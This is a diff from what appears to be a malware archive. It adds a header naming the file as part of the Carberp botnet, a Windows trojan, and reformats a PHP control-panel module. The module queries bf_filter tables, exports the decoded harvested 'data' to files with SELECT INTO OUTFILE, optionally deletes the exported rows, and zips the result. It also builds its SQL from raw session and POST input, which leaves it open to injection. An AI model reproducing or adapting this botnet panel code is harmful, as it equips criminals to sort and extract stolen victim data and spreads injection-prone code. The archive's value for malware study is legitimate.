@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $dir = str_replace('\\', '/', pathinfo(__FILE__, PATHINFO_DIRNAME));
@@ -5,7 +16,8 @@ $dir = str_replace('/modules/filters', '/', $dir);
 //$dir = $dir . 'cache/';
 $dir = '/tmp/';
 
-if(!empty($Cur['id'])){	if(file_exists($dir . $Cur['id'])) exit('LOADING FROM THIS FILTER IT IS NOT POSSIBLE, PROCESS BUSY!');
+if(!empty($Cur['id'])){
+	if(file_exists($dir . $Cur['id'])) exit('LOADING FROM THIS FILTER IT IS NOT POSSIBLE, PROCESS BUSY!');
 	file_put_contents($dir . $Cur['id'], true);
 	$filter = $mysqli->query('SELECT * FROM bf_filters WHERE (id = \''. $Cur['id'].'\')');
 
@@ -13,7 +25,8 @@ if(!empty($Cur['id'])){	if(file_exists($dir . $Cur['id'])) exit('LOADING FROM T
 		@unlink($dir . $Cur['id']);
 		exit('ERROR FILTER!');
 	}
-}elseif(!empty($Cur['str'])){	if(file_exists($dir . $Cur['str'])) exit('LOADING FROM THIS FILTER IT IS NOT POSSIBLE, PROCESS BUSY!');
+}elseif(!empty($Cur['str'])){
+	if(file_exists($dir . $Cur['str'])) exit('LOADING FROM THIS FILTER IT IS NOT POSSIBLE, PROCESS BUSY!');
 	file_put_contents($dir . $Cur['str'], true);
 
 	switch($Cur['str']){
@@ -106,7 +119,8 @@ if(count($_POST) > 0){
 
 $sql = '';
 
-if(!empty($_SESSION['search']['prefix_' . $filter->id])){	$_POST['prefix'] = $_SESSION['search']['prefix_' . $filter->id];
+if(!empty($_SESSION['search']['prefix_' . $filter->id])){
+	$_POST['prefix'] = $_SESSION['search']['prefix_' . $filter->id];
 	$sql .= '(prefix=\''.$_SESSION['search']['prefix_' . $filter->id].'\')';
 }
 
@@ -207,8 +221,10 @@ do{
 
 if(!empty($sql)) $sql = ' WHERE ' . $sql;
 
-if(empty($_POST['limit'])){	$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql);
-}else{	$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql . ' LIMIT ' . $_POST['limit']);
+if(empty($_POST['limit'])){
+	$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql);
+}else{
+	$mysqli->query('UPDATE bf_filter_' . $filter->id . ' SET save = \''.$rand.'\' ' . $sql . ' LIMIT ' . $_POST['limit']);
 }
 
 if(empty($_POST['limit'])){
@@ -222,7 +238,8 @@ if(empty($_POST['limit'])){
 
 if(empty($_SESSION['search']['addstr_' . $filter->id])){
 	$mysqli->db[0]->query('SELECT urldecode(data) INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
-}else{	$mysqli->db[0]->query('SELECT concat(urldecode(data), \''.$_SESSION['search']['addstr_' . $filter->id].'\') INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
+}else{
+	$mysqli->db[0]->query('SELECT concat(urldecode(data), \''.$_SESSION['search']['addstr_' . $filter->id].'\') INTO OUTFILE \''.$file_name.'\' FIELDS TERMINATED BY \';\' LINES TERMINATED BY \'\r\n\' FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
 }
 
 if($_POST['delete'] == 'on') $mysqli->db[0]->real_query('DELETE FROM bf_filter_' . $filter->id . ' WHERE (save = \''.$rand.'\')');
@@ -230,10 +247,12 @@ if($_POST['delete'] == 'on') $mysqli->db[0]->real_query('DELETE FROM bf_filter_'
 @unlink($dir . $filter->id);
 
 if(file_exists($file_name)){
-	if(extension_loaded ('zip')){		$zip_name = str_replace('.txt', '.zip', $file_name);
+	if(extension_loaded ('zip')){
+		$zip_name = str_replace('.txt', '.zip', $file_name);
 		$zip = new ZipArchive;
 		$res = $zip->open($zip_name, ZIPARCHIVE::OVERWRITE);
-		if($res === TRUE){			$zip->addFile($file_name, basename($file_name));
+		if($res === TRUE){
+			$zip->addFile($file_name, basename($file_name));
 			$zip->close();
 			unlink($file_name);
 			$file_name = $zip_name;
